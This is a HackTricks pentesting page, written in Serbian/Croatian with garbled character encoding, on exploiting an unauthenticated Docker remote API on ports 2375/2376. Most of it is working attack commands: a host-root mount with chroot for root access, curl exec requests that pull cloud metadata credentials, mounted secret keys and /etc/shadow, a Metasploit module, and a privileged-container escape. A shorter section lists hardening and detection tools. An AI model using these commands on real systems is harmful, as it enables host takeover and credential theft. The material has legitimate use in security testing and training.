# 2375, 2376 Pentesting Docker

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


### Docker Osnove

#### Å ta je

Docker je **prednja platforma** u **industriji kontejnerizacije**, koja predvodi **kontinuiranu inovaciju**. OmoguÄ‡ava jednostavno kreiranje i distribuciju aplikacija, od **tradicionalnih do futuristiÄkih**, i osigurava njihovu **sigurnu implementaciju** u razliÄitim okruÅ¾enjima.

#### Osnovna docker arhitektura

* [**containerd**](http://containerd.io): Ovo je **osnovni runtime** za kontejnere, zaduÅ¾en za sveobuhvatno **upravljanje Å¾ivotnim ciklusom kontejnera**. To ukljuÄuje upravljanje **prenosom i skladiÅ¡tenjem slika**, pored nadgledanja **izvrÅ¡avanja, praÄ‡enja i umreÅ¾avanja** kontejnera. **Detaljniji uvidi** o containerd su **dalje istraÅ¾eni**.
* **container-shim** igra kljuÄnu ulogu kao **posrednik** u upravljanju **headless kontejnerima**, preuzimajuÄ‡i ulogu od **runc** nakon Å¡to su kontejneri inicijalizovani.
* [**runc**](http://runc.io): Poznat po svojim **laganim i univerzalnim runtime** sposobnostima, runc je usklaÄ‘en sa **OCI standardom**. Koristi ga containerd za **pokretanje i upravljanje kontejnerima** prema **OCI smernicama**, razvijajuÄ‡i se iz originalnog **libcontainer**.
* [**grpc**](http://www.grpc.io) je kljuÄan za **olakÅ¡avanje komunikacije** izmeÄ‘u containerd i **docker-engine**, osiguravajuÄ‡i **efikasnu interakciju**.
* [**OCI**](https://www.opencontainers.org) je od suÅ¡tinskog znaÄaja za odrÅ¾avanje **OCI specifikacija** za runtime i slike, pri Äemu su najnovije verzije Dockera **usaglaÅ¡ene sa OCI standardima za slike i runtime**.

#### Osnovne komande
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** je posebno razvijen da zadovolji potrebe platformi za kontejnere kao Å¡to su **Docker i Kubernetes**, izmeÄ‘u ostalog. Njegov cilj je da **pojednostavi izvrÅ¡avanje kontejnera** na razliÄitim operativnim sistemima, ukljuÄujuÄ‡i Linux, Windows, Solaris i druge, apstrahujuÄ‡i funkcionalnosti specifiÄne za operativni sistem i sistemske pozive. Cilj Containerd-a je da ukljuÄi samo osnovne funkcije koje su potrebne njegovim korisnicima, te da teÅ¾i izostavljanju nepotrebnih komponenti. MeÄ‘utim, potpuno postizanje ovog cilja se priznaje kao izazovno.

KljuÄna dizajnerska odluka je da **Containerd ne upravlja mreÅ¾om**. MreÅ¾a se smatra kritiÄnim elementom u distribuiranim sistemima, sa sloÅ¾enostima kao Å¡to su Softverski Definisana MreÅ¾a (SDN) i otkrivanje usluga koje se znaÄajno razlikuju od jedne platforme do druge. Stoga, Containerd prepuÅ¡ta aspekte mreÅ¾e platformama koje podrÅ¾ava.

Dok **Docker koristi Containerd** za pokretanje kontejnera, vaÅ¾no je napomenuti da Containerd podrÅ¾ava samo podskup funkcionalnosti Dockera. Konkretno, Containerd nema moguÄ‡nosti upravljanja mreÅ¾om prisutne u Docker-u i ne podrÅ¾ava direktno kreiranje Docker swarm-ova. Ova razlika naglaÅ¡ava fokusiranu ulogu Containerd-a kao okruÅ¾enja za izvrÅ¡avanje kontejnera, delegirajuÄ‡i specijalizovanije funkcionalnosti platformama sa kojima se integriÅ¡e.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** je open-source motor za kontejnere koji se pridrÅ¾ava [Open Container Initiative (OCI) standarda](https://github.com/opencontainers), razvijen i odrÅ¾avan od strane Red Hat-a. Izdvaja se od Dockera sa nekoliko posebnih karakteristika, posebno svojom **arhitekturom bez demona** i podrÅ¡kom za **kontejnere bez root privilegija**, omoguÄ‡avajuÄ‡i korisnicima da pokreÄ‡u kontejnere bez root privilegija.

Podman je dizajniran da bude kompatibilan sa Docker-ovim API-jem, omoguÄ‡avajuÄ‡i koriÅ¡Ä‡enje Docker CLI komandi. Ova kompatibilnost se proteÅ¾e na njegov ekosistem, koji ukljuÄuje alate kao Å¡to su **Buildah** za izgradnju slika kontejnera i **Skopeo** za operacije sa slikama kao Å¡to su push, pull i inspect. ViÅ¡e detalja o ovim alatima moÅ¾e se naÄ‡i na njihovoj [GitHub stranici](https://github.com/containers/buildah/tree/master/docs/containertools).

**KljuÄne razlike**

* **Arhitektura**: Za razliku od Docker-ovog modela klijent-server sa pozadinskim demonima, Podman funkcioniÅ¡e bez demona. Ovaj dizajn znaÄi da se kontejneri pokreÄ‡u sa privilegijama korisnika koji ih pokreÄ‡e, poboljÅ¡avajuÄ‡i bezbednost eliminisanjem potrebe za root pristupom.
* **Integracija sa Systemd**: Podman se integriÅ¡e sa **systemd** za upravljanje kontejnerima, omoguÄ‡avajuÄ‡i upravljanje kontejnerima kroz systemd jedinice. Ovo se razlikuje od Docker-ove upotrebe systemd prvenstveno za upravljanje procesom Docker demona.
* **Kontejneri bez root privilegija**: KljuÄna karakteristika Podmana je njegova sposobnost da pokreÄ‡e kontejnere pod privilegijama korisnika koji ih pokreÄ‡e. Ovaj pristup minimizira rizike povezane sa provalama u kontejnere osiguravajuÄ‡i da napadaÄi dobiju samo privilegije kompromitovanog korisnika, a ne root pristup.

Podmanov pristup nudi sigurnu i fleksibilnu alternativu Dockera, naglaÅ¡avajuÄ‡i upravljanje privilegijama korisnika i kompatibilnost sa postojeÄ‡im Docker radnim tokovima.

{% hint style="info" %}
Napomena da, kako Podman teÅ¾i da podrÅ¾i isti API kao Docker, moÅ¾ete koristiti iste komande sa Podman-om kao sa Docker-om, kao Å¡to su:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Osnovne informacije

Remote API se po defaultu pokreÄ‡e na portu 2375 kada je omoguÄ‡en. Usluga po defaultu neÄ‡e zahtevati autentifikaciju, Å¡to omoguÄ‡ava napadaÄu da pokrene privilegovani docker kontejner. KoriÅ¡Ä‡enjem Remote API-ja moÅ¾e se prikljuÄiti host / (root direktorijum) na kontejner i Äitati/pisati datoteke iz okruÅ¾enja hosta.

**Podrazumevani port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

Napomena da za enumeraciju docker API-ja moÅ¾ete koristiti `docker` komandu ili `curl` kao u sledeÄ‡em primeru:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Ako moÅ¾ete **kontaktirati udaljeni docker API sa `docker` komandom** moÅ¾ete **izvrÅ¡iti** bilo koju od **docker** [**komandi prethodno** komentisanih](2375-pentesting-docker.md#basic-commands) da biste se interesovali za uslugu.

{% hint style="info" %}
MoÅ¾ete `export DOCKER_HOST="tcp://localhost:2375"` i **izbeÄ‡i** koriÅ¡Ä‡enje `-H` parametra sa docker komandom
{% endhint %}

**Brza eskalacija privilegija**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Ponekad Ä‡ete videti **2376** aktivan za **TLS** krajnju taÄku. Nisam mogao da se poveÅ¾em na to sa docker klijentom, ali je moguÄ‡e to uraditi sa curl.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Ako Å¾elite viÅ¡e informacija o ovome, viÅ¡e informacija je dostupno odakle sam kopirao komande: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatski
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromitovanje

Na sledeÄ‡oj stranici moÅ¾ete pronaÄ‡i naÄine da **pobegnete iz docker kontejnera**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Zloupotrebom ovoga je moguÄ‡e pobjeÄ‡i iz kontejnera, mogli biste pokrenuti slab kontejner na udaljenoj maÅ¡ini, pobjeÄ‡i iz njega i kompromitovati maÅ¡inu:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Eskalacija privilegija

Ako ste unutar hosta koji koristi docker, moÅ¾ete [**proÄitati ove informacije da pokuÅ¡ate da poveÄ‡ate privilegije**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### OtkriÄ‡e tajni u aktivnim Docker kontejnerima
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Proverite **env** (sekciju promenljivih okruÅ¾enja) za tajne i moÅ¾da Ä‡ete pronaÄ‡i:

* Lozinke.
* IP adrese.
* Portove.
* Putanje.
* Drugoâ€¦ .

Ako Å¾elite da izvuÄete datoteku:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Osiguranje vaÅ¡eg Dockera

#### Osiguranje Docker instalacije i koriÅ¡Ä‡enja

* MoÅ¾ete koristiti alat [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) da pregledate vaÅ¡u trenutnu docker instalaciju.
* `./docker-bench-security.sh`
* MoÅ¾ete koristiti alat [https://github.com/kost/dockscan](https://github.com/kost/dockscan) da pregledate vaÅ¡u trenutnu docker instalaciju.
* `dockscan -v unix:///var/run/docker.sock`
* MoÅ¾ete koristiti alat [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) da proverite privilegije koje Ä‡e kontejner imati kada se pokrene sa razliÄitim sigurnosnim opcijama. Ovo je korisno da se zna koje su posledice koriÅ¡Ä‡enja nekih sigurnosnih opcija za pokretanje kontejnera:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Osiguranje Docker slika

* MoÅ¾ete koristiti docker sliku [https://github.com/quay/clair](https://github.com/quay/clair) da skenira vaÅ¡e druge docker slike i pronaÄ‘e ranjivosti.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Osiguranje Dockerfile-ova

* MoÅ¾ete koristiti alat [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste pogreÅ¡nih konfiguracija. Svaka pogreÅ¡na konfiguracija Ä‡e dobiti ID, moÅ¾ete pronaÄ‡i ovde [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) kako da ispravite svaku od njih.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* MoÅ¾ete koristiti alat [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste pogreÅ¡nih konfiguracija.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* MoÅ¾ete koristiti alat [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste pogreÅ¡nih konfiguracija.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* MoÅ¾ete koristiti alat [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste pogreÅ¡nih konfiguracija.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### BeleÅ¾enje sumnjive aktivnosti

* MoÅ¾ete koristiti alat [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) da detektujete **sumnjivo ponaÅ¡anje u pokrenutim kontejnerima**.
* Obratite paÅ¾nju u sledeÄ‡em delu kako **Falco kompajlira kernel modul i umetne ga**. Nakon toga, uÄitava pravila i **poÄinje da beleÅ¾i sumnjive aktivnosti**. U ovom sluÄaju je detektovao 2 privilegovana kontejnera koja su pokrenuta, jedan od njih sa osetljivim montiranjem, i nakon nekoliko sekundi je detektovao kako je shell otvoren unutar jednog od kontejnera.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Monitoring Docker

MoÅ¾ete koristiti auditd za praÄ‡enje dockera.

### References

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
